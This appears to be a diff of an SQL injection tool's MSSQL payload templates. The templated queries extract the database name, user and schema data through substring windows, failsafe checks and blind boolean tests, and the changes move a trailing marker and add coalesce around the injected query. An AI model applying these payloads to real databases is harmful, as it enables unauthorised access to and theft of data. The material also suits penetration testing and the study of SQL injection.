@@ -8,7 +8,6 @@ resource:
       %2bdb_name()
       %2b'${enclose_value_sql}'
       %2buser
-      %2b'${trail_sql}'
 
  schema:
   database: |
@@ -43,8 +42,7 @@ resource:
                    ),
                    2
                )
-           )
-           %2b '${trail_sql}',
+           ),
            ',',
            '${separator_cell_sql}'
        )
@@ -82,8 +80,7 @@ resource:
                    ),
                    2
                )
-           )
-           %2b '${trail_sql}',
+           ),
            ',',
            '${separator_cell_sql}'
        )
@@ -124,8 +121,7 @@ resource:
                    ),
                    2
                )
-           )
-           %2b '${trail_sql}',
+           ),
            ',',
            '${separator_cell_sql}'
        )
@@ -164,8 +160,7 @@ resource:
                     ),
                     2
                 )
-            )
-            %2b '${trail_sql}',
+            ),
             ',',
             '${separator_cell_sql}'
         )
@@ -188,10 +183,14 @@ strategy:
        select
            '${lead}'
            %2bsubstring(
-               (${injection}),
+               coalesce(
+                   (${injection}),
+                   ''
+               ),
                ${window.char},
                65536
            )
+           %2b'${trail_sql}'
    )
   limit: and rnum BETWEEN ${limit.value} and 65536
   failsafe: convert(varchar, (1337${indice}7330%2b1))
@@ -245,7 +244,6 @@ strategy:
         )
         %26 ${bit}
     )
-   length: len(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
